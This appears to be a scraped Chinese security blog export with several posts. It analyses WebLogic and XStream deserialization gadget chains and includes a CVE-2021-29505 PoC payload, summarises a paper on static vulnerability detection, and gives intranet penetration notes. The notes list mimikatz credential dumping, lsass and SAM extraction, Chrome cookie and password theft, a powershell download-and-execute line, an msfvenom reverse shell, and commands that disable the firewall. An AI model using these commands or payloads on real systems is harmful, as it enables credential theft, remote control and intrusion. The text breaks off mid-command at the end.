https://github.com/5up3rc/weblogic_cmd\n\n工具分析\ncom.supeream.Main#executeBlind()获取参数，然后执行WebLogicOperation.blindExecute()\n\n其中给命令赋值，并根据参数os来决定使用的系统命令，接下来进入SerialDataGenerator.serialBlindDatas()\n\n首先会在SerialDataGenerator#blindExecutePayloadTransformerChain()构建恶意反序列化对象，可以看到就是构建的CC1利用链\n\n之后进入serialData()，继续构造CC1链。之后进入BypassPayloadSelector.selectBypass()\n\n这里可以看到我们熟悉的用来绕过黑名单的利用类streamMessageImpl，如果Main.TYPE参数未指明，那么默认就是streamMessageImpl。\n\n同时，这里可以看到会先对payload对象进行一次序列化，并封装到streamMessageImpl的buffer属性数组当中\n\n进一步，会再对streamMessageImpl对象进行一次序列化，形成最终的JAVA序列化数据\n\n最终会在T3ProtocolOperation#send()中将JAVA序列化数据拼接如T3协议数据中，与前面漏洞的构造原理一致\n\n服务端部分分析\n刚开始与之前的漏洞调用过程一致，也会进入InboundMsgAbbrev.ServerChannelInputStream()\n\n由于我这里没有用的补丁调试，所以看不出黑名单的拦截过程。但是最终会通过到StreamMessageImpl#readExternal，而不再走之前ServerChannelInputStream中readObject之后的路，后者设置了一系列黑名单拦截。而在StreamMessageImpl#readExternal()中会进一步调用本身的readObject进行二次反序列化（也就是我们之前序列化时的buffer数组中的内容），最终触发CC1\n\n\n整体调用栈\n- readObject:331, AnnotationInvocationHandler (sun.reflect.annotation)  invoke0:-1, NativeMethodAccessorImpl (sun.reflect)  invoke:57, NativeMethodAccessorImpl (sun.reflect)  invoke:43, DelegatingMethodAccessorImpl (sun.reflect)  invoke:601, Method (java.lang.reflect)  invokeReadObject:1004, ObjectStreamClass (java.io)  readSerialData:1891, ObjectInputStream (java.io)  readOrdinaryObject:1796, ObjectInputStream (java.io)  readObject0:1348, ObjectInputStream (java.io)  readObject:370, ObjectInputStream (java.io)- readExternal:1419, StreamMessageImpl (weblogic.jms.common)  readExternalData:1835, ObjectInputStream (java.io)  readOrdinaryObject:1794, ObjectInputStream (java.io)  readObject0:1348, ObjectInputStream (java.io)  readObject:370, ObjectInputStream (java.io)  readObject:66, InboundMsgAbbrev (weblogic.rjvm)\n\n\nCVE-2016-3510与CVE-2016-0638原理一致，都是基于黑名单的绕过。这里用的是weblogic.corba.utils.MarshalledObject类\n我们还是先看exp，其因为TYPE改成了marshall，所以会将payload(也就是恶意AnnotationInvocationHandler对象)作为参数传入marshalledObject方法。\n\n跟入可以看到序列化的恶意payload会被写入objBytes成员变量中\n\n\n反序列化分析\n\nweblogic.corba.utils.MarshalledObject这个类没有实现readObject或者readExternal函数，所以在反序列化的时候采用ObjectInputStream的默认流程。但这个流程会调用辅助类ObjectStreamClass的invokeReadResolve函数，后者会调用MarshalledObject的readResolve函数，查看readResolve我们会发现，readResolve中有readObject的调用，而其参数正来自其本身的objBytes变量\n\n\n\n\n调用链如下\nreadObject:331, AnnotationInvocationHandler (sun.reflect.annotation)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:57, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:601, Method (java.lang.reflect)invokeReadObject:1004, ObjectStreamClass (java.io)readSerialData:1891, ObjectInputStream (java.io)readOrdinaryObject:1796, ObjectInputStream (java.io)readObject0:1348, ObjectInputStream (java.io)readObject:370, ObjectInputStream (java.io)readResolve:58, MarshalledObject (weblogic.corba.utils)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:57, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:601, Method (java.lang.reflect)invokeReadResolve:1091, ObjectStreamClass (java.io)readOrdinaryObject:1805, ObjectInputStream (java.io)readObject0:1348, ObjectInputStream (java.io)readObject:370, ObjectInputStream (java.io)readObject:66, InboundMsgAbbrev (weblogic.rjvm)\n\n\n参考链接https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&amp;mid=2247485058&amp;idx=1&amp;sn=d22b310acf703a32d938a7087c8e8704\nhttp://wjlshare.com/archives/1573\nhttps://www.anquanke.com/post/id/226070#h2-15\nhttps://xz.aliyun.com/t/10173\nhttps://y4er.com/posts/weblogic-cve-2016-0638/#exp%E5%88%86%E6%9E%90\nhttps://www.anquanke.com/post/id/224593\n","tags":["JAVA安全"]},{"title":"XStream与tabby","url":"/2022/11/10/xstream%E4%B8%8Etabby/","content":"写在前面tabby熟悉便从作者的xstream挖掘cve开始\n给出一个tabby查询模板\nmatch (source:Method) // 添加where语句限制source函数match (sink:Method &#123;IS_SINK:true&#125;) // 添加where语句限制sink函数call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 12) yield path // 查找具体路径,12代表深度，可以修改return * limit 20\n根据作者的一条链子，我们直接增加限制\nmatch (source:Method &#123;NAME:&quot;compare&quot;&#125;)match (sink:Method &#123;IS_SINK:true, NAME:&quot;invoke&quot;&#125;)&lt;-[:CALL]-(m1:Method &#123;NAME: &quot;createValue&quot;&#125;)call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 12) yield path return * limit 20\n\n关键调用sink点的函数为sun.swing.SwingLazyValue#createValue()\n\n该函数可以看到可以导入一个任意类并调用其静态函数或者构造函数，其中的类名、方法名以及参数名均可控\n\n通过查询，下面这个类的静态函数可以直接JNDI注入\nmatch (source:Method &#123;IS_PUBLIC:true, IS_STATIC:true&#125;)match (sink:Method &#123;IS_SINK: true, NAME:&quot;lookup&quot;&#125;)call apoc.algo.allSimplePaths(sink, source, &quot;&lt;CALL|ALIA&quot;, 8) yield pathreturn path limit 20\n\n&lt;javax.naming.InitialContext: java.lang.Object doLookup(java.lang.String)&gt;\n\n往上回溯调用链，定位javax.swing.UIDefaults#getFromHashtable()\n\n这里value值可以手动填充，并且可以直接构造成sun.swing.SwingLazyValue就能够执行createValue方法\n\n继续往上回溯javax.swing.UIDefaults#get，这里没有阻碍点\n\njavax.swing.MultiUIDefaults#get，这里我jdk就没有扫到了不知道为啥，先看下。这里既可以通过替换类属性tables，也可以直接替换hashtable本身的value值\n\njavax.swing.MultiUIDefaults#toString，这里会遍历table中的key，所以一定会触发get\n\n继续往上找调用了toString的链子。从头开始分析，javax.naming.ldap.Rdn$RdnEntry#compareTo，类属性调用了equals方法\nmatch (source:Method) where source.NAME in [&quot;compareTo&quot;]match (sink:Method &#123;NAME:&quot;toString&quot;&#125;)&lt;-[r:CALL]-(m1:Method) where r.REAL_CALL_TYPE in [&quot;java.lang.Object&quot;]call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 5) yield pathreturn path limit 20\n\n\n\ncom.sun.org.apache.xpath.internal.objects.XString#equals()\n\n贴一下整个调用链\njavax.naming.ldap.Rdn$RdnEntry.compareTo ??    com.sun.org.apache.xpath.internal.objects.XString.equal        javax.swing.MultiUIDefaults.toString ??            UIDefaults.get ??                UIDefaults.getFromHashTable                    UIDefaults$LazyValue.createValue                    SwingLazyValue.createValue                        javax.naming.InitialContext.doLookup()\n因此关键构造如下所示\nUIDefaults uiDefaults = new UIDefaults();Object multiUIDefaults =  ReflectionHelper.newInstance(&quot;javax.swing.MultiUIDefaults&quot;, new Object[]&#123;new UIDefaults[]&#123;uiDefaults&#125;&#125;);uiDefaults.put(&quot;lazyValue&quot;, obj);Object rdnEntry1 = ReflectionHelper.newInstance(&quot;javax.naming.ldap.Rdn$RdnEntry&quot;, null);ReflectionHelper.setFieldValue(rdnEntry1, &quot;type&quot;, &quot;ysomap&quot;);ReflectionHelper.setFieldValue(rdnEntry1, &quot;value&quot;, new XString(&quot;test&quot;));Object rdnEntry2 = ReflectionHelper.newInstance(&quot;javax.naming.ldap.Rdn$RdnEntry&quot;, null);ReflectionHelper.setFieldValue(rdnEntry2, &quot;type&quot;, &quot;ysomap&quot;);ReflectionHelper.setFieldValue(rdnEntry2, &quot;value&quot;, multiUIDefaults);return PayloadHelper.makeTreeSet(rdnEntry2, rdnEntry1);\n基于XStream-1.4.16 CVE-2021-29505的探索先看看CVE-2021-29505\npoc\n&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;    &lt;unserializable-parents/&gt;    &lt;java.util.PriorityQueue&gt;        &lt;default&gt;            &lt;size&gt;2&lt;/size&gt;        &lt;/default&gt;        &lt;int&gt;3&lt;/int&gt;        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;            &lt;type&gt;12345&lt;/type&gt;            &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;&gt;                &lt;m__obj class=&#x27;string&#x27;&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: none&lt;/m__obj&gt;            &lt;/value&gt;        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;            &lt;type&gt;12345&lt;/type&gt;            &lt;value class=&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27; serialization=&#x27;custom&#x27;&gt;                &lt;message class=&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;&gt;                    &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;                    &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;                    &lt;bodyParts/&gt;                    &lt;sm class=&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;&gt;                        &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;                        &lt;multiPart class=&#x27;com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart&#x27;&gt;                            &lt;soapPart/&gt;                            &lt;mm&gt;                                &lt;it class=&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;&gt;                                    &lt;aliases class=&#x27;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&#x27;&gt;                                        &lt;candidates class=&#x27;com.sun.jndi.rmi.registry.BindingEnumeration&#x27;&gt;                                            &lt;names&gt;                                                &lt;string&gt;aa&lt;/string&gt;                                                &lt;string&gt;aa&lt;/string&gt;                                            &lt;/names&gt;                                            &lt;ctx&gt;                                                &lt;environment/&gt;                                                &lt;registry class=&#x27;sun.rmi.registry.RegistryImpl_Stub&#x27; serialization=&#x27;custom&#x27;&gt;                                                    &lt;java.rmi.server.RemoteObject&gt;                                                        &lt;string&gt;UnicastRef&lt;/string&gt;                                                        &lt;string&gt;127.0.0.1&lt;/string&gt;                                                        &lt;int&gt;2333&lt;/int&gt;                                                        &lt;long&gt;0&lt;/long&gt;                                                        &lt;int&gt;0&lt;/int&gt;                                                        &lt;long&gt;0&lt;/long&gt;                                                        &lt;short&gt;0&lt;/short&gt;                                                        &lt;boolean&gt;false&lt;/boolean&gt;                                                    &lt;/java.rmi.server.RemoteObject&gt;                                                &lt;/registry&gt;                                                &lt;host&gt;127.0.0.1&lt;/host&gt;                                                &lt;port&gt;2333&lt;/port&gt;                                            &lt;/ctx&gt;                                        &lt;/candidates&gt;                                    &lt;/aliases&gt;                                &lt;/it&gt;                            &lt;/mm&gt;                        &lt;/multiPart&gt;                    &lt;/sm&gt;                &lt;/message&gt;            &lt;/value&gt;        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;    &lt;/java.util.PriorityQueue&gt;&lt;/java.util.PriorityQueue&gt;\n\n本质是在RegistryImpl_Stub反序列化，会先还原父类，调用`RemoteObject#readObject。其最终会有一个JRMP的连接请求产生。即source点为RemoteObject#readObject()\n即简化调用链为\nsun.rmi.registry.RegistryImpl_Stub#readObjectsun.rmi.server.UnicastRef#readExternal# trigger rmi\nXStream 1.4.17限制\n黑名单正则\n\n\n黑名单\n\n\n黑名单继承对象\n\n\n\nCVE-2021-29505的调用链如下\njavax.naming.ldap.Rdn$RdnEntry#compareTo com.sun.org.apache.xpath.internal.objects.XString#equal com.sun.xml.internal.ws.api.message.Packet#toString com.sun.xml.internal.ws.message.saaj.SAAJMessage#copycom.sun.xml.internal.ws.message.saaj.SAAJMessage#getAttachmentscom.sun.xml.internal.ws.message.saaj.SAAJMessage$SAAJAttachmentSet#&lt;init&gt;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl#getAttachmentscom.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl#initializeAllAttachmentscom.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart#getCountcom.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart#parsecom.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart#parseAllcom.sun.xml.internal.org.jvnet.mimepull.MIMEMessage#getAttachmentscom.sun.xml.internal.org.jvnet.mimepull.MIMEMessage#parseAll com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage#makeProgress com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator#hasNext com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator#findNextCertcom.sun.jndi.toolkit.dir.LazySearchEnumerationImpl#nextElement ==拉黑==com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl#findNextMatch ==拉黑==com.sun.jndi.rmi.registry.BindingEnumeration#next sun.rmi.registry.RegistryImpl_Stub#lookup ==拉黑==\n因此，前半部分仍然是可利用的，起点即从findNextCert()开始找\n\n我们可以利用aliases属性延续后面链子的查找。\n其中类需要满足的性质\n\n实现了Enumeration接口\n拥有nextElement()函数，并且最终能到达恶意sink函数\n绕过所有的黑名单\n\n针对source点的限制实现\nmatch (source:Method &#123;NAME:&quot;nextElement&quot;&#125;)&lt;-[:HAS]-(cls:Class)-[:INTERFACE|EXTENDS*]-&gt;(cls1:Class &#123;NAME:&quot;java.util.Enumeration&quot;&#125;)match (source)-[:CALL]-&gt;(m1:Method)\n​    sink点，找可实现JNDI注入的\nmatch (sink:Method &#123;IS_SINK:TRUE, VUL:&quot;JNDI&quot;&#125;)\n增加黑名单过滤\nmatch (source:Method &#123;NAME:&quot;nextElement&quot;&#125;)&lt;-[:HAS]-(cls:Class)-[:INTERFACE|EXTENDS*]-&gt;(cls1:Class &#123;NAME:&quot;java.util.Enumeration&quot;&#125;)match (source)-[:CALL]-&gt;(m1:Method)match (sink:Method &#123;IS_SINK:TRUE, VUL:&quot;JNDI&quot;&#125;)call apoc.algo.allSimplePaths(sink, m1, &quot;&lt;CALL|ALIAS&quot;, 8) yield pathwhere none(n in nodes(path) where n.CLASSNAME in [&quot;java.beans.EventHandler&quot;, &quot;java.lang.ProcessBuilder&quot;, &quot;javax.imageio.ImageIO$ContainsFilter&quot;, &quot;jdk.nashorn.internal.objects.NativeString&quot;, &quot;com.sun.corba.se.impl.activation.ServerTableEntry&quot;, &quot;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&quot;, &quot;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&quot;, &quot;sun.swing.SwingLazyValue&quot;, &quot;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&quot;, &quot;com.sun.jndi.rmi.registry.BindingEnumeration&quot;, &quot;sun.rmi.registry.RegistryImpl_Stub&quot;, &quot;com.sun.jndi.cosnaming.CNBindingEnumeration&quot;, &quot;com.sun.jndi.toolkit.dir.HierMemDirCtx$FlatBindings&quot;, &quot;com.sun.jndi.ldap.LdapReferralException&quot;])return source, path limit 50\n参考链接\nhttps://www.freebuf.com/vuls/278188.html\nhttps://blog.0kami.cn/blog/2021/how_to_find_gadget_chains_2/\nhttps://blog.0kami.cn/blog/2021/how_to_find_gadget_chains/\nhttps://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E6%B5%8B%E8%AF%95%E5%AF%B9%E8%B1%A1/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/web%E7%BB%84%E4%BB%B6/XStream/CVE-2021-29505/XStream-CVE-2021-29505-poc%E4%BF%AE%E6%AD%A3.html\n\n","tags":["JAVA安全"]},{"title":"《面向源代码的软件漏洞静态检测综述》论文笔记","url":"/2023/01/28/%E3%80%8A%E9%9D%A2%E5%90%91%E6%BA%90%E4%BB%A3%E7%A0%81%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E9%9D%99%E6%80%81%E6%A3%80%E6%B5%8B%E7%BB%BC%E8%BF%B0%E3%80%8B%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/","content":"《面向源代码的软件漏洞静态检测综述》论文笔记引言部分\n软件漏洞的定义\n指软件在器生命周期（即开发、部署、执行整个过程）中存在的缺陷\n\n软件漏洞静态检测分类\n\n基于分析对象\n\n二进制漏洞检测\n源代码漏洞检测\n\n由于源代码当中拥有更丰富的语义信息，因此关注点更多在后者\n\n源代码漏洞检测方法\n\n基于中间表示的漏洞检测\n\n首先将源代码转换为有利于漏洞检测的中间表示，然后对中间表示进行分析，检查是否匹配预定义的某个漏洞规则，从而判断源程序中是否含有对应漏洞规则相关的漏洞\n\n\n基于逻辑推理的漏洞检测\n\n将源代码进行形式化描述，然后利用数学推理、证明等方法验证形式化描述的一些性质，从而判断程序是否含有某种类型的漏洞\n\n后者可靠性强，但是不适于大规模的项目代码\n\n\n\n基于中间表示的源代码漏洞检测方法\n2 基于代码相似性的漏洞检测核心思想：相似的代码很可能含有相同的漏洞缺陷：很难检测那些不是由代码复制引发的漏洞\n\n代码表征\n用来抽象代码段，方式多样\n基于度量的表征：从代码段不同角度采取不同的度量\n基于复杂性、内聚和耦合\n基于相似的导入和函数调用集合\n缺陷在于无法表示比较单元的全部特征，也就是只能参考某几个角度\n基于标记的表征：仅利用词法分析得到的标记序列进行比较\nReDeBug 特征散列法标记 + diff\nLi 基于滑动窗口进行比对 \nScandariato 文本挖掘，偏深度学习预测\nYamaguchi 将函数转换为主要API使用模式的组合，配合机器学习\nCP-Miner 频繁子序列挖掘技术\n缺陷在于 仅停留在词法级别，而没有分析语法语义信息\n基于树的表征： 利用树来表示源码中的程序结构\nYamaguchi 提取函数的抽象语法树 + 机器学习分析结构模式\nSecureSync 采用扩展的抽象语法树 \n缺陷在于 复杂度较高，难以用在大工程中\n基于图的表征：节点表示表达式或语句，边表示控制流、数据流或控制依赖，在前面的基础之上还加入了语义信息\nYamaguchi 提出代码属性图的概念，其结合了抽象语法树、控制流图和程序依赖图 （YAMAGUCHI F, GOLDE N, ARP D, et al. Modeling and discovering vulnerabilities with code property graphs[C]）\nCBCD 子图同构匹配 + 4种PDG查询的优化法\nSecureSync 基于图的API\n缺陷在于 建立图、匹配图的算法复杂度都很高\n\n代码段级别\n代码段抽象的粒度级别\n\n不带上下文的补丁级用于错误检测\n\n切片级基于程序依赖图，代码相似性通过子图间的同构来表示\n（李赞, 边攀, 石文昌, 等. 一种利用补丁的未知漏洞发现方法）\n\n带上下文的补丁级别\n\n函数片段 函数作为独立单元\n\n文件/构件代码段级别 \n\n\n\n比较方法向量比较法首先将程序的表征转换为向量，然后通过向量进行比对；近似/精确匹配法通过一些匹配策略来查找漏洞表征\n\n\n3 基于符号执行的漏洞检测分为符合执行和约束求解两部分技术，前者用于将程序变量值转换为符号值和常量组成的计算表达式；后者用来判断变量取值是否满足约束，一方面检测路径可达，另一方面检测漏洞触发条件。\n动静态结合 （沈维军, 汤恩义, 陈振宇, 等. 数值稳定性相关漏洞隐患的自动化检测方法）\n符号执行可以生成触发漏洞的具体输入，验证并分析漏洞但是无法扩展到大规模程序\n4 基于规则的漏洞检测人工分析漏洞规则 + 源代码建模，进行数据流分析、污点分析等\n（王蕾, 李丰, 李炼, 等. 污点分析技术的原理和实践应用）\n很依赖规则的定义\n5 基于机器学习的漏洞检测按照是否需要人工定义表征来划分：\n\n基于传统机器学习的方法\n针对特定漏洞类型的方法：机器学习技术学习漏洞模式，前提需要借助专家知识\n给定一个sink，自动识别 source-sink 系统以及构建系统中数据流和净化的模式\n（YAMAGUCHI F, WRESSNEGGER C, GASCON H. et al. Chucky: exposing missing checks in source code for vulnerability discovery[C]）\n针对漏洞类型无关的方法：也需要手工定义特征。这里的特征也就是前面提到的漏洞表征\n\n基于深度学习的方法\n可以自动生成漏洞模式\n缺陷在于：1）粗粒度 2）数据集涵盖不足 3）深度学习模型有限 4）止步于检测出是否有漏洞\n利用深度学习进行API学习 (GU X, ZHANG H, ZHANG D, et al. Deep API learning[C])\n\n\n6 实例1: 基于源代码相似性的漏洞检测\n问题阐述\n需求：当某个漏洞的补丁公布时，在给定漏洞和源代码的前提下自动判断源代码是否含有该漏洞，给出漏洞的位置\n待解决的问题：\n\n不存在能够用来评测基于代码相似性进行漏洞检测研究的数据集\n不存在某个代码相似性算法适用于所有漏洞\n\n\n解决方案\n架构如下：\n\n学习阶段：选择对给定漏洞有效的代码相似性算法，选择的算法反过来知道漏洞前面的生成\n检测阶段：复制漏洞检测\n首先给定漏洞及其补丁，该漏洞可通过描述漏洞补丁的diff文件来刻画，由基本特征和修补特征集合来表示\n大致流程：\n\n通过diff块及对应的漏洞代码复制实例构件数据集\n\n基于数据集，首先对diff块进行文本分析和语法分析，提取定义的类型特征；然后通过在函数级构件抽象语法树，利用算法进行节点匹配，生成操作序列，进一步提取类型特征\n\n代码相似度算法：\n输入：候选代码相似性算法、漏洞 diff 块特征向量、准确率阈值和 VCID 数据库输出：CVE-算法映射表\n\n\n生成漏洞签名：首先提取漏洞代码和修补diff代码；根据算法的代码段级别从源码中提取漏洞代码段；预处理并表示，最后应得到相应的代码表征作为漏洞签名\n\n漏洞检测部分：\n首先CVE-算法映射表的作用是可以根据diff块及选择的代码相似性算法使用的代码表征生成目标程序签名；然后通过在目标程序签名中匹配漏洞签名来确定漏洞位置\n\n\n\n\n\n\n7 实例2: 面向源代码的软件漏洞智能检测\n问题阐述\n当前想解决的问题在于基于人类专家定义漏洞特征的手段主观性较强，质量参差；同时漏报较高\n目标：漏洞检测系统低漏报，误报在可接受的范围内\n方向：深度学习，借鉴 CV 中的目标检测\n待解决的问题：\n\n没有明显的细粒度代码结构来描述漏洞的候选区域\n数据集无法涵盖所有类型，且标注困难\n模型不合适\n\n\n解决方案\n架构如下：\n\n基于 BLSTM 自动学习生成漏洞模式\n学习阶段：\n\n提取API调用的多个切片组合成为一个代码段\n为代码段根据已知漏洞信息加标签\n代码段 -&gt; 符号表征 -&gt; 向量（BLSTM 输入）\n训练 BLSTM 神经网络\n\n检测阶段：\n前面步骤和学习阶段类似，最后是针对有无漏洞对代码段进行分类\n效果上优于基于代码相似性的方法\n\n\n\n\n","tags":["软件漏洞分析"]},{"title":"内网渗透——信息收集—凭证信息获取&&本地历史信息获取","url":"/2023/01/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/","content":"内网信息收集二凭证信息收集\n密码哈希\n哈希类型分为两种：\n\nLM型\nNTLM型\n\n下面是windows不同版本所使用的哈希类型\n\n对于2003之前版本，密码位数大于14位时使用NTLM型；后续版本均默认使用NTLM型哈希值\n\n主流密码抓取凭证工具\n\nmimikatz\n从内存当中抓取当前登录用户的密码及其哈希值\n常用本地非交互式凭证获取。实际场景由于是上传一个mimikatz，很多shell并不支持交互式使用，因此常用非交互式获取凭证\nmimikatz.exe &quot;log res.txt&quot; &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; &quot;exit&quot; mimikatz.exe &quot;log res.txt&quot; &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;\n\nlog res.txt 将日志记录到res.txt中\nprivilege::debug  通过debug模式提权\ntoken::elevate 获取高权限token，从而获取权限\n::查看模块及包含功能的信息\nlsadump::sam 从sam文件中解析账户哈希值\nsekurlsa::logonpasswords  获取账户密码的明文值，获取不到的话回显null\n\n对于低版本1.x的mimikatz，使用方式如下\nprivilege::debug // 提权inject::process lsass.exe sekurlsa.dll   // 注入sekurlsa.dll 到 lsass.exe进程 lsass.exe在系统启动后会记录密码信息@getLogonPasswords获取密码\n免杀操作\nhttps://www.freebuf.com/articles/system/234365.html\n绕过查杀的方式之一：Powershell远程加载mimikatz脚本\n可以针对关键字进行混淆\n\nIEX会将对象加载进内存中并执行后面的函数\npowershell.exe IEX (New-Object-Net WebClient).DownloadString(&quot;url&quot;); Invoke-Mimikatz-DumpCreds\n\nwce\n适用于win7低版本操作系统\n-w 获取明文密码-l 获取当前在线用户NTLM哈希值\n\nPwddump7\npwddump7.exe &gt; res.txt\n获取当前系统各个密码的哈希值\n解密利用彩虹表 https://www.objectif-securite.ch/ophcrack\n\nOphcrack\n配合彩虹表自己破解\n工具下载：https://ophcrack.sourceforge.io/\n彩虹表：\nhttps://ophcrack.sourceforge.io/tables.phphttp://project-rainbowcrack.com/table.htm\n\nProcdump+Mimikatz\nProcdump的作用主要是免杀，现在可以用的是SharpDump(C#写的不太会编译…)\n会将当前系统进程当中的哈希保存到bin文件，改成zip文件并解压\n主要流程就是 将lsass进程导出，形成转储文件\n32位操作系统: processdump.exe -accepteula -ma lsass.exe lsass.dmp64位操作系统: processdump.exe -ma lsass.exe lsass,dmp\n然后再使用之前Mimikatz的模块提取明文密码\nsekursa::mimidump lsass.dmpsekursa::logonPasswords full\n\n注册表导出\nreg save HKLM\\SYSTEM system.hivreg save HKLM\\SAM sam.hivreg save HKLM\\SECURITY security security.hiv\n获取注册表中的SAM信息、用户登录密码哈希信息并导出为文件\n再利用下面的方式进行明文获取\nmimikatz.exe &quot;lsadump::sam /system.hiv /sam:sam.hiv&quot;  exit python secretsdump.py -sam -sam.hiv -security security.hiv -system system.hiv LOCAL\nhttps://github.com/AlessandroZ/LaZagne 多种恢复本地信息密码的工具\n\n\n本地信息收集\nIE浏览器代理信息查看\nreg query &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Setting&quot;\n\nWindows Wifi密码获取\nnetsh wlan show profile name=&quot;wifiName&quot; key=clear\n\nWindows hosts config\ntype C:\\Windows\\System32\\drivers\\etc\\hosts\n\nWindows IIS config\nIIS6: cscript.exe C:\\Inetpub\\AdminScripts\\adsuitil.vbs ENUM W3SVC/1/root IIS7/8:列出网站列表: %systemroot%/system32/inetsrv/appcmd.exe list site列出网站物理路径: %systemroot%\\system32\\inetsrv\\appcmd.cxe list vdir Mimikatz读取IIS7配置文件密码:mimikatz.exe privilege::debug log &quot;iis::apphost/in&quot;%systemroot%\\system32\\inetsrv\\config\\applicationHost config&quot; /live&quot; exit\n\nWindows回收站信息获取\n回收站路径为C:\\$Recycle.Bin，不同用户对应不同的回收站，需要遍历一下用户id值来找各自删除的文件\nFOR /f &quot;skip=1 tokens=1,2 delims= &quot; %c in (&#x27;wmic useraccount get name^,sid&#x27;)do dir /a/b\n\nChrome的密码和cookie获取\n%localappdata%\\google\\chrom\\USERDA~1\\dedault\\LOGIND~1%localappdata%\\google\\chrom\\USERDA~1\\dedault\\cookieschrom用户信息保存在本地为sqlite数据库格式mimikatz.exe privilege::debug log &quot;dpapi::chrom/in:%localappdata%\\google\\chrom\\USERDA~1\\default\\cookies /unprotect&quot; exit mimikatz.exe privilege::debug log &quot;dpapi::chrom/in:%localappdata%\\google\\chrom\\USERDA~1\\default\\LOGIND~1&quot; exit\n\nPowershell\npowershell.exe IEX(new-object net.webclient).downloadstring(&#x27;http://vps:port/GEt-Information.ps1&#x27;);Get-Information\n\n\n\n\n","tags":["内网渗透"]},{"title":"内网渗透——信息收集—利用MSF进行信息收集","url":"/2023/01/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","content":"写在前面开启内网渗透的学习啦，感觉这一部分在护网和渗透比赛方面很重要，而且能复习一下计网知识。打算先看个入门视频，然后再去看《内网渗透体系建设》这本书，建立自己的知识体系。加油加油！\n内网信息收集\n信息收集思路\n\n系统管理员密码\n用户session，远程桌面开放情况和共享连接记录\n浏览器密码及cookies\nwindows、数据库密码获取\nhost文件获取，dns缓存信息收集\n进程、补丁、网络代理、软件列表等信息\nvpn历史密码、teamview密码、启动项、iis配置信息等\n一些工具\n\n\n工具化信息收集 —— msf\n\nmsf反弹shell\n反弹shell的目的是什么？\n\n一般来说目标主机与我们攻击者之间都存在防火墙等安全设备，限制了流入目标主机的流量，导致我们直接连接目标主机会失败。所以我们想让目标主机主动连接我们，这就是反弹shell。\n\n首先获取到自己主机ip后输入payload\nmsfvenom -p windows/meterpreter/reverse_tcp -f exe --platform windows -a x86 -e generic/none LHOST=172.16.80.136 LPORT=444 &gt; &#x27;/home/racerz/windows-meterpreter-staged-reverse-tcp-444.exe&#x27;\n生成的恶意软件拖进虚拟机，实际是通过webshell上传至目标服务器（需要先拿下webshell权限）\n接下来需要配置会话处理程序\nmsfconsole  use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 172.16.80.136set lport 444run\n\n接下来目标机触发exe程序，这里为了能正常通信只能先关掉防火墙\n可以看到这里会建立一个id为1的会话\n\n其次我们通过如下命令从meterpreter命令行切换至目标机shell\nshellexecute -f cmd -i -H#-f指定执行一个可执行程序, -H表示隐藏进程, -i通过创建的进程返回一个操作接口\n回显出来由于操作系统编码不一致会导致乱码问题，可通过解决\nchcp 65001\n\n通过shell关闭防火墙\nnetsh advfirewall set allprofiles state offnetsh advfirewall show allprofiles 通过策略添加防火墙规则隐藏行为:netsh advfirewall set  add rule name=&quot;VMWARE&quot; protocol=TCP dir=in localport=5555 action=allow# 下面的win10以上已废弃netsh firewall add portopening TCP 5555 &quot;VMWARE&quot;  ENABLE ALL重启让配置生效:shutdown -r -f -t 